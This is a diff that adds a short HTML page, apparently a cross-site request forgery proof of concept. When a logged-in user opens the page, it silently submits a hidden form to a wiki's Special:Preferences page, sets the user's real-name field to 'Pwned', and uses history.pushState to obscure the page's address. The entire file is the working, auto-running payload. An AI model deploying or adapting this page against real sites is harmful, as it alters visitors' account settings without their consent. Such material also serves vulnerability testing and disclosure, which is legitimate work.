@@ -1,0 +1,12 @@
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form name="valve" action="https://wiki.example.com/wiki/Special:Preferences" method="POST">
+      <input type="hidden" name="wprealname" value="Pwned" />
+      <input type="submit" value="Submit request" style="display: none;"/>
+    </form>
+  </body>
+</html>
+<script type="text/javascript">
+    document.valve.submit();
+</script>
